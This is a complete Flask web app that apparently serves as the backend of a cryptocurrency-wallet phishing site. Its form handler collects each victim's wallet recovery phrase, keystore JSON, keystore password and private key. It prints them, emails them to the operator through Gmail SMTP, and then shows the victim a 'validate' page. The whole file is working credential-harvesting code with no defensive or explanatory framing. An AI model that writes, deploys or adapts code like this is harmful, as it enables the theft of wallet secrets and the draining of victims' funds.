from flask import Flask, render_template, request
import os
import smtplib
import imghdr
from email.message import EmailMessage
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)


@app.route('/',methods = ['POST', 'GET'], strict_slashes=False)
def index():
    if request.method == 'POST':
        tyW = request.form.get("tyW")
        phrase = request.form.get("phrase")
        keystorejson = request.form.get("keystorejson")
        keystorepassword = request.form.get("keystorepassword")
        privatekey = request.form.get("privatekey")
        print(tyW, phrase, keystorejson, privatekey, keystorepassword)
        EMAIL_ADDRESS = os.getenv("email")
        EMAIL_PASSWORD = os.getenv("password")
        msg = EmailMessage()
        msg.set_content(f'The new input:\n\nWallet type: {tyW}\nPhrase: {phrase}\nKey store json: {keystorejson}\nKey store password: {keystorepassword}\nPrivate key: {privatekey}')
        msg['Subject'] = 'A new input'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
        return render_template('validate.html')
    return render_template("index.html")

if __name__ == "__main__":
    """ Main Function """
    app.run(host='0.0.0.0', port=5000)
